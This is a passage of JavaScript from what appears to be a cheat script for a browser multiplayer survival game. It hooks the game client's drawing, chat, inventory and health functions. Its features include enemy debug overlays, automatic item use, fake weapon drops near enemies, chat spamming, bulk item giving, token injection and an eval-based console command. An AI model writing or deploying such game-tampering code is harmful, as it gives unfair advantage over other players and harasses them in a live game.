                }
                if (EXCLUDED_VEHICLES.has(player.vehicle) && player.speed > 180) {
                  const fx = player.vehicle_fx5 > 30 ? player.vehicle_fx5 - 30 : 0;
                  const scale = 1 + Math.min(fx / 180, 1) * 0.35;
                  drawPlayerHp(player, scale);
                }
              }
            }
            if (Settings.DrawHpInMyPlayer.e || Settings.DrawTimerInPlayer.e && Settings.DrawTimerInPlayer.isInMyPlayer) {
              const myPlayer = world.fast_units[user.uid];
              if (myPlayer && !myPlayer.ghost) {
                let scale = 1;
                const vehicle = myPlayer.vehicle;
                const isExcludedVehicle = vehicle === INV.MOUNT_BABY_DRAGON || vehicle === INV.MOUNT_BABY_LAVA || vehicle === INV.MOUNT_HAWK || vehicle === INV.PLANE || vehicle === INV.NIMBUS || vehicle === INV.MOUNT_PARROT || vehicle === INV.MOUNT_VULTURE;
                if (myPlayer.tower === 0 && !isExcludedVehicle) {
                  const fx = Math.max(myPlayer.tower_fx, 0);
                  if (fx > 0.001) {
                    scale = 1 + Math.min(fx / 100, 1) * 0.18;
                  }
                } else if (myPlayer.tower === 1 && (myPlayer.speed < 180 || !isExcludedVehicle)) {
                  const fx = Math.max(myPlayer.tower_fx, 0);
                  scale = 1 + Math.min(fx / 100, 1) * 0.18;
                } else if (isExcludedVehicle) {
                  const fx = Math.max(myPlayer.vehicle_fx5 - 30, 0);
                  if (myPlayer.speed > 180 || myPlayer.speed <= 180) {
                    scale = 1 + Math.min(fx / 180, 1) * 0.35;
                  }
                }
                ctx.save();
                ctx.scale(scale, scale);
                user.cam.x /= scale;
                user.cam.y /= scale;
                myPlayer.x /= scale;
                myPlayer.y /= scale;
                ctx.translate(user.cam.x + myPlayer.x, user.cam.y + myPlayer.y);
                if (Settings.DrawTimerInPlayer.e && Settings.DrawTimerInPlayer.isInMyPlayer) {
                  const timeElapsed = (Date.now() - __p_ePLv_TimerTools_HPTimer) / 1000;
                  const secondsLeft = 10 - timeElapsed;
                  let timerText;
                  let fillStyle;
                  if (secondsLeft > 5) {
                    timerText = Math.ceil(secondsLeft - 5);
                    fillStyle = "white";
                  } else {
                    timerText = secondsLeft <= 2 && user.gauges.l !== 1 ? secondsLeft.toFixed(1) : Math.ceil(secondsLeft);
                    fillStyle = "#6da151";
                  }
                  ctx.save();
                  ctx.translate(0, 46);
                  ctx.font = "22px Baloo Paaji";
                  ctx.lineWidth = 3;
                  ctx.strokeStyle = "black";
                  ctx.fillStyle = fillStyle;
                  ctx.textAlign = "center";
                  ctx.textBaseline = "middle";
                  ctx.strokeText(timerText, 0, 0);
                  ctx.fillText(timerText, 0, 0);
                  ctx.restore();
                  if (user.winter.tempest && user.blizzard) {
                    ctx.save();
                    ctx.translate(-25, 46);
                    ctx.font = "22px Baloo Paaji";
                    ctx.lineWidth = 3;
                    ctx.strokeStyle = "black";
                    ctx.fillStyle = "#79ecfd";
                    ctx.textAlign = "center";
                    ctx.textBaseline = "middle";
                    const impactBlizzardElapsed = performance.now() - isCantHealInBlizzardStartTime;
                    const timerText = Math.floor(5 - impactBlizzardElapsed % 4000 / 1000);
                    ctx.strokeText(timerText, 0, 0);
                    ctx.fillText(timerText, 0, 0);
                    ctx.restore();
                  }
                }
                if (Settings.DrawHpInMyPlayer.e) {
                  ctx.font = "30px Baloo Paaji";
                  ctx.textAlign = "center";
                  ctx.textBaseline = "top";
                  ctx.lineWidth = 5;
                  const hpToDraw = Math.round(user.gauges.l * 200);
                  const [low, high] = Settings.DrawHpInMyPlayer.Threshold;
                  if (hpToDraw > high) {
                    ctx.fillStyle = "#E8F5E9";
                    ctx.strokeStyle = "#1B5E20";
                  } else if (hpToDraw > low) {
                    ctx.fillStyle = "#FFF3E0";
                    ctx.strokeStyle = "#C77800";
                  } else {
                    ctx.fillStyle = "#FFEBEE";
                    ctx.strokeStyle = "#B71C1C";
                  }
                  ctx.strokeText(hpToDraw, 0, -60);
                  ctx.fillText(hpToDraw, 0, -60);
                }
                user.cam.x *= scale;
                user.cam.y *= scale;
                myPlayer.x *= scale;
                myPlayer.y *= scale;
                ctx.restore();
              }
            }
            if (Settings.ExitVehicle.e) {
              let myPlayer = world.fast_units[user.uid];
              if (myPlayer) {
                ctx.save();
                ctx.translate(user.cam.x + myPlayer.x, user.cam.y + myPlayer.y);
                ctx.font = "20px Baloo Paaji";
                ctx.fillStyle = "white";
                ctx.strokeStyle = "black";
                ctx.lineWidth = 4;
                ctx.strokeText("ExitVehicle", 20, 40);
                ctx.fillText("ExitVehicle", 20, 40);
                ctx.restore();
              }
            }
            if (Settings.AnimalCounter.e) {
              ctx.save();
              ctx.font = "18px Baloo Paaji";
              ctx.fillStyle = "white";
              ctx.strokeStyle = "black";
              ctx.lineWidth = 3;
              let lineY = 700;
              function drawUnitInfo(_param_758, _param_757) {
                let _var_a58 = world.units[_param_757].length;
                if (_var_a58 > 0) {
                  let text = "" + _param_758 + ": " + _var_a58;
                  ctx.strokeText(text, 10, lineY);
                  ctx.fillText(text, 10, lineY);
                  lineY += 20;
                }
              }
              drawUnitInfo("Kraken 🐙", ITEMS.KRAKEN);
              drawUnitInfo("Sandworm 🐛", ITEMS.SAND_WORM);
              drawUnitInfo("LavaDragon 🐉", ITEMS.LAVA_DRAGON);
              drawUnitInfo("BabyLava", ITEMS.BABY_LAVA);
              drawUnitInfo("BabyDragon", ITEMS.BABY_DRAGON);
              ctx.restore();
            }
          }
        };
        Object.defineProperty(game, "draw_scene", {
          get() {
            return this[draw_sceneKey];
          }
        });
      } else {
        console.log("Cant find draw_scene key in game");
      }
    }
    {
      const gaugesKey = Object.keys(client).find(key => {
        return typeof client[key] === "function" && client[key].length === 7;
      });
      if (gaugesKey) {
        let original_function = client[gaugesKey];
        client[gaugesKey] = function (l, h, c, t, o, wa, bandage) {
          if (Math.floor(11 - (Date.now() - __p_ePLv_TimerTools_HPTimer) / 1000) < 5 || l / 100 > user.gauges.l) {
            __p_ePLv_TimerTools_HPTimer = Date.now();
          }
          __p_ePLv_TimerTools_GaugeTimer = Date.now();
          original_function.apply(this, arguments);
        };
      } else {
        console.log("Failed to hook client.gauges");
      }
    }
    {
      const original_function = client.select_inv;
      function autoPilotHandler() {
        if (!Settings?.AutoPilot?.e) {
          return;
        }
        const myPlayer = world.fast_units[user.uid];
        if (!myPlayer || myPlayer.vehicle !== 0) {
          return;
        }
        const hatsPriority = [INV.PILOT_HELMET, INV.WITCH_HAT];
        for (const hat of hatsPriority) {
          if (user.inv?.n?.[hat] && myPlayer.clothe !== hat) {
            original_function.call(this, hat);
            isPullingPilot = true;
            workerTimers.setTimeout(() => {
              isPullingPilot = false;
            }, (PingCounter || 0) + 100);
            break;
          }
        }
      }
      function autoPirateHatHandler() {
        if (Settings.AutoPirateHat.e) {
          const myPlayer = world.fast_units[user.uid];
          if (user.inv.n[INV.PIRATE_HAT] && myPlayer && myPlayer.clothe !== INV.PIRATE_HAT && myPlayer.vehicle === 0) {
            original_function.call(this, INV.PIRATE_HAT);
          }
        }
      }
      function fakeDropWeaponHandler(_param_759) {
        if (Settings.FakeDropWeapon.e) {
          const myPlayer = world.fast_units[user.uid];
          if (myPlayer && myPlayer.right === _param_759 && !user.weapon.wait) {
            if (world.units[ITEMS.PLAYERS].some(player => {
              return !player.ghost && !player.ally && Utils.dist(myPlayer, player) < (myPlayer.fly ? 400 : 350) && myPlayer.fly === player.fly;
            })) {
              send_drop_one(INV.WOOD);
            }
          }
        }
      }
      const action = {
        [INV.MOUNT_BABY_DRAGON]: autoPilotHandler,
        [INV.MOUNT_BABY_LAVA]: autoPilotHandler,
        [INV.PLANE]: autoPilotHandler,
        [INV.MOUNT_HAWK]: autoPilotHandler,
        [INV.MOUNT_PARROT]: autoPilotHandler,
        [INV.MOUNT_VULTURE]: autoPilotHandler,
        [INV.NIMBUS]: autoPilotHandler,
        [INV.DIVING_MASK]: function () {
          isPullingDiving = true;
          workerTimers.setTimeout(() => {
            isPullingDiving = false;
          }, PingCounter + 100);
        },
        [INV.BOAT]: autoPirateHatHandler
      };
      for (const weaponId of weapons) {
        action[weaponId] = fakeDropWeaponHandler;
      }
      client.select_inv = function (invId) {
        action[invId]?.call(this, invId);
        original_function.apply(this, arguments);
      };
    }
    if (client.chat) {
      const orignial_function = client.chat;
      client.chat = async function (_param_760) {
        if (Settings.MuteEnemyChat.e) {
          const pid = arguments[0][1];
          if (!user.in_team(pid)) {
            return;
          }
        }
        if (Settings.Translator.e && Settings.Translator.IncomingMessage) {
          let e = _param_760;
          let textIncoming = e[2];
          let targetLang = Settings.Translator.MyLanguage;
          let result = await detectAndTranslate(textIncoming, targetLang);
          if (result.error) {
            console.log(result.error);
          } else if (result.detectedLang != targetLang) {
            _param_760[2] = "[" + result.detectedLang + "->" + targetLang + "] " + result.translatedText;
          }
        }
        orignial_function.apply(this, args);
      };
    }
    if (client.send_chat) {
      const orignial_function = client.send_chat;
      client.send_chat = async function () {
        if (Settings.Translator.e && Settings.Translator.OutgoingMessage) {
          let textOutgoing = arguments[0];
          let translateToLang = Settings.Translator.TranslateTo;
          let result = await detectAndTranslate(textOutgoing, translateToLang);
          if (result.error) {
            console.log(result.error);
          } else if (result.detectedLang != translateToLang) {
            arguments[0] = result.translatedText;
          }
        }
        orignial_function.apply(this, arguments);
      };
    }
    if (client.gauges_life) {
      const original_function = client.gauges_life;
      client.gauges_life = function (l, bandage) {
        let myPlayer = world.fast_units[user.uid];
        if (myPlayer) {
          if (Settings.AutoCrown.e && user.inv.n[INV.CROWN_OF_THE_ANGEL] && !myPlayer.ghost) {
            if (myPlayer.clothe !== INV.CROWN_OF_THE_ANGEL && l / 100 < user.gauges.l && l * 2 <= Settings.AutoCrown.health_to_activate) {
              if (user.craft.crafting) {
                send_cancel_crafting();
              }
              send_select_inv(INV.CROWN_OF_THE_ANGEL);
            }
          }
        }
        if (Settings.AutoBottleZMA.e && world.mode === 6) {
          if (l / 100 < user.gauges.l && l * 2 <= Settings.AutoBottleZMA.hpForItemActivation) {
            send_select_inv(INV.BOTTLE_FULL);
            if (!isCheckingHealthForAutoBottle) {
              isCheckingHealthForAutoBottle = true;
              const interval = workerTimers.setInterval(() => {
                if (user.gauges.l * 200 > Settings.AutoBottleZMA.hpForItemActivation) {
                  workerTimers.clearInterval(interval);
                  isCheckingHealthForAutoBottle = false;
                }
              }, 10);
            }
          }
        }
        if (Math.round((Date.now() - __p_ePLv_TimerTools_GaugeTimer) / 1000) % 5 === 0) {
          if (l / 100 > user.gauges.l) {
            __p_ePLv_TimerTools_HPTimer = Date.now();
          }
        }
        if (l / 100 !== user.gauges.l && lmbClient && lmbClient.socket && lmbClient.socket.readyState === 1) {
          lmbClient.send_update_hp(l * 2);
        }
        original_function.apply(this, arguments);
      };
    }
    if (client.craft_ok) {
      const original_function = client.craft_ok;
      client.craft_ok = function () {
        let currentRight = null;
        let myPlayer = world.fast_units[user.uid];
        if (incomingRight === INV.BOOK) {
          if (myPlayer) {
            currentRight = myPlayer.right;
            myPlayer.right = INV.BOOK;
          }
        }
        isInCrafting = true;
        original_function.apply(this, arguments);
        if (currentRight !== null) {
          myPlayer.right = currentRight;
        }
      };
    }
    if (world.delete_units) {
      const original_function = world.delete_units;
      world.delete_units = function (uid) {
        if (autoCameraControlActive) {
          if (!deletedUids.includes(uid)) {
            deletedUids[deletedUids.length] = uid;
          }
        } else {
          original_function.apply(this, arguments);
          if (deletedUids.length > 0) {
            for (let i = 0, len = deletedUids.length; i < len; i++) {
              original_function.call(this, deletedUids[i]);
            }
            deletedUids = [];
          }
        }
      };
    }
    {
      let game_body = document.getElementById("game_body");
      const original_funcion = game_body.onresize;
      game_body.onresize = function () {
        original_funcion.apply(this, arguments);
        resize_canvas();
      };
      resize_canvas();
    }
    {
      const keys = Object.keys(client);
      const function_name = keys.find(key => {
        return typeof client[key] === "function" && client[key].toString().replace(/\s+/g, "").includes(".length") && client[key].toString().replace(/\s+/g, "").includes("].time");
      });
      if (function_name) {
        const currentIndex = keys.indexOf(function_name);
        const targetIndex = currentIndex - 14;
        const targetFunctionName = keys[targetIndex];
        if (targetFunctionName && typeof client[targetFunctionName] === "function") {
          const originalFunction = client[targetFunctionName];
          client[targetFunctionName] = function (item, id) {
            if (Settings.BulkItems.e) {
              var amount = Settings.BulkItems.amount;
              while (amount > 0) {
                const chunkAmount = amount > 255 ? 255 : amount;
                originalFunction.call(this, item, id, chunkAmount);
                amount -= chunkAmount;
              }
            } else {
              originalFunction.apply(this, arguments);
            }
          };
        }
      } else {
        console.log("Failed to hook give_item");
      }
    }
    if (client.leaderboard) {
      const original_fucntion = client.leaderboard;
      client.leaderboard = function () {
        original_fucntion.apply(this, arguments);
        if (ThisTabMiniMized) {
          client.timeout_server = performance.now();
        }
      };
    } else {
      console.log("Failed to hook function client.leaderboard");
    }
    if (client.try_ping) {
      const keys = Object.keys(client);
      const try_pingKey = keys.find(_param_761 => {
        return client[_param_761] === client.try_ping;
      });
      const indexOfTryPing = keys.indexOf(try_pingKey);
      const ping_delayKey = keys[indexOfTryPing - 1];
      Object.defineProperty(client, "ping_delay", {
        get() {
          return this[ping_delayKey];
        },
        set(value) {
          this[ping_delayKey] = value;
        }
      });
      const original_fucntion = client.try_ping;
      client.try_ping = function () {
        if (ThisTabMiniMized) {
          if (performance.now() - this.ping_delay > __p_O0mQ_CLIENT_PING_DELAY) {
            this.ping_delay = performance.now();
            this.ping();
          }
        } else {
          original_fucntion.apply(this, arguments);
        }
      };
    }
    if (game.trigger_mouseup) {
      const original_function = game.trigger_mouseup;
      game.trigger_mouseup = function () {
        if (!isClickingGUI) {
          const oldUserGhostEnabled = user.ghost.enabled;
          user.ghost.enabled = false;
          original_function.apply(this, arguments);
          user.ghost.enabled = oldUserGhostEnabled;
        } else {
          isClickingGUI = false;
        }
      };
      window.removeEventListener("mouseup", original_function, false);
      window.addEventListener("mouseup", game.trigger_mouseup, false);
    }
    if (game.safe_delete) {
      if (game.safe_delete.all) {
        const original_function = game.safe_delete.all;
        game.safe_delete.all = function () {
          const oldUserGhostEnabled = user.ghost.enabled;
          user.ghost.enabled = false;
          original_function.apply(this, arguments);
          user.ghost.enabled = oldUserGhostEnabled;
        };
        document.getElementById("yes_delete").removeEventListener("mouseup", original_function, false);
        document.getElementById("yes_delete").addEventListener("mouseup", game.safe_delete.all, false);
      }
      if (game.safe_delete.one) {
        const original_function = game.safe_delete.one;
        game.safe_delete.one = function () {
          const oldUserGhostEnabled = user.ghost.enabled;
          user.ghost.enabled = false;
          original_function.apply(this, arguments);
          user.ghost.enabled = oldUserGhostEnabled;
        };
        document.getElementById("one_delete").removeEventListener("mouseup", original_function, false);
        document.getElementById("one_delete").addEventListener("mouseup", game.safe_delete.one, false);
      }
    }
    if (user.terminal.commands && user.terminal.write_command) {
      const original_fucntion = user.terminal.commands;
      user.terminal.commands = function (cmd) {
        if (cmd.startsWith("exe ")) {
          const parts = cmd.split("exe");
          const afterExe = parts[1];
          let resultExe;
          try {
            resultExe = eval(afterExe);
          } catch {
            resultExe = "Error";
          }
          const result = "<span style=\"color:green\">" + resultExe + "</span>";
          this.write_command("exe", 1, "execution code in the console", result);
          return true;
        }
        switch (cmd) {
          case "list":
            let result = "";
            let players = world.players;
            for (let i = 0, len = players.length; i < len; i++) {
              const player = players[i];
              if (player.alive) {
                let dayCount;
                if (player.joinTime) {
                  dayCount = Math.floor((performance.now() - player.joinTime) / 1000 / 60 / 8);
                }
                result += "<span style=\"color:" + (user.in_team(i) || i === user.id ? "cyan" : "red") + "\">" + player.nickname + "</span> <span style=\"color:yellow\">[" + player.level + "]</span> <span style=\"color:green\">#" + i + "</span> " + (dayCount !== undefined ? dayCount + (dayCount > 1 ? " days" : " day") : "") + "<br />";
              }
            }
            this.write_command("list", 1, "List all connected players", result);
            return true;
          default:
            original_fucntion.apply(this, arguments);
        }
      };
    }
    if (user.gauges) {
      if (user.gauges.update && user.gauges.warn_cold && user.gauges.warn_life && user.gauges.warn_hunger && user.gauges.warn_thirst && user.gauges.warn_oxygen && user.gauges.warn_warm) {
        const original_function = user.gauges.update;
        user.gauges.update = function () {
          this.warn_cold.update();
          this.warn_life.update();
          this.warn_hunger.update();
          this.warn_thirst.update();
          this.warn_oxygen.update();
          this.warn_warm.update();
          original_function.apply(this, arguments);
        };
      }
    }
    if (game.gauges?.img) {
      if (Settings.GaugesUI === "new") {
        game.gauges.defaultImg = game.gauges.img;
        game.gauges.img = mySprite[MY_SPRITE.NEW_GAUGES];
      }
    }
    if (game.trigger_mousedown) {
      const original_function = game.trigger_mousedown;
      game.trigger_mousedown = function () {
        if (!isClickingGUI) {
          original_function.apply(this, arguments);
        }
      };
      window.removeEventListener("mousedown", original_function, false);
      window.addEventListener("mousedown", game.trigger_mousedown, false);
    }
    if (client.units) {
      const original_function = client.units;
      client.units = function () {
        original_function.apply(this, arguments);
        afterClientUnits();
      };
    }
    if (game.draw_ui) {
      const original_function = game.draw_ui;
      game.draw_ui = function () {
        original_function.apply(this, arguments);
        let myPlayer = world.fast_units[user.uid];
        if (!Settings.HideScript.e) {
          if (Settings.ShowCraftTime.e && user.craft.crafting && myPlayer) {
            const values = Object.values(user.craft.timeout);
            const v = values[1];
            const max_speed = values[4];
            const time_remaining = (1 - v) / max_speed;
            ctx.save();
            ctx.translate(user.cam.x + myPlayer.x, user.cam.y + myPlayer.y);
            ctx.textAlign = "center";
            ctx.textBaseline = "middle";
            ctx.font = "24px Baloo Paaji";
            ctx.fillStyle = "white";
            ctx.lineWidth = 5;
            if (world.time) {
              ctx.strokeStyle = "#287483";
            } else {
              ctx.strokeStyle = "#59b68a";
            }
            const textToDisplay = time_remaining.toFixed(1);
            ctx.strokeText(textToDisplay, 0, -122);
            ctx.fillText(textToDisplay, 0, -122);
            ctx.restore();
          }
          if (Settings.WorldInfo.e) {
            ctx.save();
            let _x = -125;
            if (user.desert.tempest && sandstormImage.complete && sandstormImage.naturalWidth !== 0) {
              ctx.drawImage(sandstormImage, user.auto_feed.translate.x + _x, user.auto_feed.translate.y - 8);
              _x -= 71;
            }
            if (user.winter.tempest && blizzardImage.complete && blizzardImage.naturalWidth !== 0) {
              ctx.drawImage(blizzardImage, user.auto_feed.translate.x + _x, user.auto_feed.translate.y - 8);
            }
            ctx.restore();
          }
          if (Settings.Debug.e) {
            ctx.save();
            ctx.font = "" + Settings.Debug.fontSize + "px Baloo Paaji";
            ctx.strokeStyle = "black";
            ctx.fillStyle = "white";
            ctx.lineWidth = 4;
            ctx.textAlign = "left";
            ctx.textBaseline = "top";
            const myPlayer = world.fast_units[user.uid];
            for (let unitIndex = 0; unitIndex < world.units.length; unitIndex++) {
              const entityList = world.units[unitIndex];
              if (typeof entityList === "object" && entityList.length > 0) {
                for (let entityIndex = 0; entityIndex < entityList.length; entityIndex++) {
                  const entity = entityList[entityIndex];
                  if (entity.type === ITEMS.ROOF && !Settings.Debug.debugRoof) {
                    continue;
                  }
                  if (entity.type === ITEMS.BRIDGE && !Settings.Debug.debugBridge) {
                    continue;
                  }
                  if (entity.type === ITEMS.PLOT && !Settings.Debug.debugPlot) {
                    continue;
                  }
                  const distToPlayer = myPlayer ? Utils.dist(myPlayer, entity) : 9999;
                  if (distToPlayer >= 9999) {
                    continue;
                  }
                  const posX = user.cam.x + entity.x;
                  const posY = user.cam.y + entity.y - 50 - Settings.Debug.fontSize;
                  let lineOffset = 0;
                  const lineHeight = Settings.Debug.fontSize + 2;
                  function drawDebugLine(text) {
                    if (text === undefined || text === null) {
                      return;
                    }
                    const yPos = posY + lineOffset;
                    if (posX > -100 && posX < canw + 100 && yPos > -20 && yPos < canh + 20) {
                      ctx.strokeText(text, posX, yPos);
                      ctx.fillText(text, posX, yPos);
                      lineOffset += lineHeight;
                    }
                  }
                  if (Settings.Debug.showType && entity.type !== undefined) {
                    drawDebugLine("Type: " + entity.type);
                  }
                  if (Settings.Debug.showPID && entity.pid !== undefined) {
                    let ownerName = entity.pid !== 0 && world.players[entity.pid] ? " (" + world.players[entity.pid].nickname + ")" : "";
                    drawDebugLine("PID: " + entity.pid + ownerName);
                  }
                  if (Settings.Debug.showID && entity.id !== undefined) {
                    drawDebugLine("ID: " + entity.id);
                  }
                  if (Settings.Debug.showInfo && entity.info !== undefined) {
                    drawDebugLine("Info: " + entity.info);
                  }
                  if (Settings.Debug.showCoordinates) {
                    if (entity.x !== undefined) {
                      drawDebugLine("X: " + Math.round(entity.x));
                    }
                    if (entity.y !== undefined) {
                      drawDebugLine("Y: " + Math.round(entity.y));
                    }
                  }
                  if (Settings.Debug.showDistance && myPlayer) {
                    drawDebugLine("Dist: " + Math.round(distToPlayer));
                  }
                  if (Settings.Debug.showSpeed && entity.speed !== undefined) {
                    drawDebugLine("Speed: " + Math.round(entity.speed));
                  }
                }
              }
            }
            ctx.restore();
          }
          if (Settings.ShowBuildLimit.e) {
            if (world.max_units) {
              ctx.save();
              if (user.inv.can_select.length > 0) {
                ctx.translate(canw - 10, game.minimap.translate.y - scale * 130);
              } else {
                ctx.translate(canw - 10, game.minimap.translate.y - scale * 60);
              }
              ctx.font = "18px Baloo Paaji";
              ctx.fillStyle = "white";
              ctx.strokeStyle = "black";
              ctx.textAlign = "right";
              ctx.lineWidth = 3;
              const textToDisplay = "Building: " + buildLimit + "/" + world.max_units;
              ctx.strokeText(textToDisplay, 0, 0);
              ctx.fillText(textToDisplay, 0, 0);
              ctx.restore();
            }
          }
          if (Settings.ShowInBed.e) {
            if (myPlayer) {
              if (world.units[ITEMS.BED].find(bed => {
                return Math.abs(myPlayer.x - bed.x) < 34 && Math.abs(myPlayer.y - bed.y) < 34;
              })) {
                ctx.save();
                ctx.font = "40px Baloo Paaji";
                ctx.strokeStyle = "#5c3e1e";
                ctx.lineWidth = 7;
                ctx.strokeText("B", user.auto_feed.translate.x + 85, user.auto_feed.translate.y + 225);
                ctx.fillStyle = "#785320";
                ctx.fillText("B", user.auto_feed.translate.x + 85, user.auto_feed.translate.y + 225);
                ctx.restore();
              }
            }
          }
          if (Settings.ShowLastDead.e) {
            draw_text_in_minimap(Settings.ShowLastDead.Pos, "💀", 10, "black");
            if (user.bigmap) {
              draw_text_in_bigmap(Settings.ShowLastDead.Pos, "💀", 30, "black");
            }
          }
          if (Settings.ShowTotemInMap.e) {
            draw_text_in_minimap(TotemCoor, "🗿", 10, "black");
            if (user.bigmap) {
              draw_text_in_bigmap(TotemCoor, "🗿", 30, "black");
            }
          }
          if (Settings.ShowFPS.e) {
            ctx.save();
            ctx.font = "30px Baloo Paaji";
            ctx.strokeStyle = "black";
            ctx.lineWidth = 7;
            ctx.strokeText(FPSCounter + " FPS", user.auto_feed.translate.x + -120, 40);
            ctx.fillStyle = "white";
            ctx.fillText(FPSCounter + " FPS", user.auto_feed.translate.x + -120, 40);
            ctx.restore();
          }
          if (Settings.ShowPing.e) {
            ctx.save();
            ctx.font = "30px Baloo Paaji";
            ctx.strokeStyle = "black";
            ctx.lineWidth = 7;
            ctx.strokeText(PingCounter + " ms", user.auto_feed.translate.x + -120, 70);
            ctx.fillStyle = "white";
            ctx.fillText(PingCounter + " ms", user.auto_feed.translate.x + -120, 70);
            ctx.restore();
          }
        }
        performAntiCrack();
      };
    }
  }
  function waitForGameObjects() {
    return new Promise(resolve => {
      function checkObjects() {
        if (typeof world !== "undefined" && typeof client !== "undefined" && typeof user !== "undefined" && typeof game !== "undefined" && typeof mouse !== "undefined" && typeof ui !== "undefined" && typeof keyboard !== "undefined") {
          resolve();
        } else {
          workerTimers.setTimeout(checkObjects, 100);
        }
      }
      checkObjects();
    });
  }
  function WaitForCraftingIsFalse() {
    return new Promise(_param_762 => {
      function check() {
        if (user.craft.crafting === false) {
          _param_762();
        } else {
          workerTimers.setTimeout(check, 50);
        }
      }
      check();
    });
  }
  function waitForSocketReady() {
    return new Promise(resolve => {
      function checkSocket() {
        if (client.socket instanceof WebSocket) {
          resolve();
        } else {
          workerTimers.setTimeout(checkSocket, 100);
        }
      }
      checkSocket();
    });
  }
  function chatxterm() {
    if (document.getElementById("chat_block").style.display === "inline-block" || document.getElementById("commandMainBox").style.display === "inline-block" || document.activeElement.id === "nickname_input") {
      return true;
    } else {
      return false;
    }
  }
  function SetToken() {
    user.token = Settings.Token.token;
    user.token_id = Settings.Token.token_id;
  }
  function CheckPing() {
    if (Settings.ShowPing.e && client.socket && world.fast_units && client.socket.readyState === 1 && world.fast_units[user.uid]) {
      start_ping_time = Date.now();
      client.get_focus();
    }
  }
  function SpamChat() {
    if (isClientReadyAndUserAlive()) {
      if (Settings.SpamChat.message) {
        send_chat(Settings.SpamChat.message);
      }
    }
    if (Settings.SpamChat.e) {
      workerTimers.setTimeout(SpamChat, 4500);
    }
  }
  function FakeDrop() {
    if (client.socket && client.socket.readyState === 1 && user && user.alive) {
      WaitForCraftingIsFalse().then(() => {
        if (Settings.FakeDrop.e) {
          send_drop_one(INV.WOOD);
          workerTimers.setTimeout(FakeDrop, Math.random() * 2000 + 1000);
        }
      });
    } else {
      Settings.FakeDrop.e = false;
    }
  }
  function canCraftWithOneTime(invId, inventory, recipes = RECIPES) {
    const recipe = recipes.find(_param_763 => {
      return _param_763.id2 === invId;
    });
    if (!recipe) {
      console.log("Dont have recipe in RECIPES");
      return false;
    }
    for (const ingredient of recipe.r) {
      const itemId = ingredient[0];
      const requiredAmount = ingredient[1];
      if (!inventory[itemId] || inventory[itemId] < requiredAmount) {
        return false;
      }
    }
    return true;
  }
  function canCraftWithManyTimes(_param_765, _param_764) {
    const inventory = {
      ..._param_764
    };
    function canCraftInvRecursive(invId, inventory) {
      const recipe = RECIPES.find(r => {
        return r.id2 === invId;
      });
      if (!recipe) {
        return false;
      }
      for (const ingredient of recipe.r) {
        const invId = ingredient[0];
        const requiredAmount = ingredient[1];
        if (!inventory[invId] || inventory[invId] < requiredAmount) {
          const amount = requiredAmount - (inventory[invId] ? inventory[invId] : 0);
          for (let i = 0; i < amount; i++) {
            if (!canCraftInvRecursive(invId, inventory)) {
              return false;
            }
          }
        } else {
          inventory[invId] -= requiredAmount;
        }
      }
      const craftedItemId = recipe.id2;
      inventory[craftedItemId] = (inventory[craftedItemId] || 0) + 1;
      return true;
    }
    return canCraftInvRecursive(_param_765, inventory);
  }
  function getMissingRawIngredients(invId, initialInventory, recipes = RECIPES) {
    const inventory = {
      ...initialInventory
    };
    function _getMissingRawIngredientsRecursive(invId, currentInventory, recipeList) {
      const recipe = recipeList.find(_param_766 => {
        return _param_766.id2 === invId;
      });
      if (!recipe) {
        return null;
      }
      let missingIngredients = {};
      for (const [ingredientItemId, requiredAmount] of recipe.r) {
        const availableAmount = currentInventory[ingredientItemId] || 0;
        if (availableAmount < requiredAmount) {
          const amountNeeded = requiredAmount - availableAmount;
          const subIngredientMissing = _getMissingRawIngredientsRecursive(ingredientItemId, currentInventory, recipeList);
          if (subIngredientMissing === null) {
            missingIngredients[ingredientItemId] = (missingIngredients[ingredientItemId] || 0) + amountNeeded;
          } else if (Object.keys(subIngredientMissing).length > 0) {
            for (const missingId in subIngredientMissing) {
              missingIngredients[missingId] = (missingIngredients[missingId] || 0) + subIngredientMissing[missingId];
            }
          }
        }
      }
      if (Object.keys(missingIngredients).length > 0) {
        return missingIngredients;
      } else {
        return {};
      }
    }
    const missing = _getMissingRawIngredientsRecursive(invId, inventory, recipes);
    if (missing === null) {
      return null;
    }
    return missing;
  }
  function getPrerequisiteCraftId(invId, inventory, recipes = RECIPES) {
    function _getPrerequisiteCraftId(_param_769, _param_768, _param_767) {
      const recipe = _param_767.find(r => {
        return r.id2 === _param_769;
      });
      if (!recipe) {
        return null;
      }
      for (const [ingredientItemId, requiredAmount] of recipe.r) {
        const availableAmount = _param_768[ingredientItemId] || 0;
        if (availableAmount < requiredAmount) {
          const recipe = _param_767.find(_param_770 => {
            return _param_770.id2 === ingredientItemId;
          });
          if (recipe) {
            if (canCraftWithOneTime(recipe.id2, _param_768)) {
              return recipe.id;
            } else {
              return _getPrerequisiteCraftId(recipe.id2, _param_768, _param_767);
            }
          }
        }
      }
      return null;
    }
    return _getPrerequisiteCraftId(invId, inventory, recipes);
  }
  function craftInv(_param_771) {
    const recipes = RECIPES;
    const inventory = user.inv.n;
    let _var_809 = undefined;
    if (canCraftWithOneTime(_param_771, inventory, recipes)) {
      _var_809 = recipes.find(r => {
        return r.id2 === _param_771;
      }).id;
    } else {
      _var_809 = getPrerequisiteCraftId(_param_771, inventory, recipes);
    }
    send_craft(_var_809);
  }
  function getHpInFuture(item, timestamp, isAnimalDamage = true) {
    let currentHp = item.currentHp;
    const players = world.units[ITEMS.PLAYERS];
    for (let i = 0, len = players.length; i < len; i++) {
      const player = players[i];
      if (item.type === ITEMS.PLAYERS && item.pid === player.pid) {
        continue;
      }
      if (player.pid === user.id) {
        continue;
      }
      if (player.startAttackTime + 62.5 >= performance.now() + 25 && player.startAttackTime + 62.5 <= timestamp + 25) {
        if (getDamageRangeOfPlayer(player) + 25 >= Utils.dist(item, player)) {
          currentHp -= getDamageOfPlayer(player, isAnimalDamage);
        }
      }
    }
    return currentHp;
  }
  function send_attack_item(_param_772, _param_773) {
    if (!_param_772 || !_param_773) {
      return;
    }
    let _var_810 = calcAngle(_param_772, _param_773, true);
    send_angle(_var_810);
    send_attack(_var_810);
    stop_attack();
    return _var_810;
  }
  function draw_dot_in_minimap(coors, color, size) {
    if (coors && coors.x && coors.y) {
      let _minimapTranslation;
      if (user.inv.can_select.length > 0) {
        _minimapTranslation = {
          x: game.minimap.translate.x,
          y: game.minimap.translate.y - scale * 120
        };
      } else {
        _minimapTranslation = {
          x: game.minimap.translate.x,
          y: game.minimap.translate.y - scale * 50
        };
      }
      ctx.fillStyle = color;
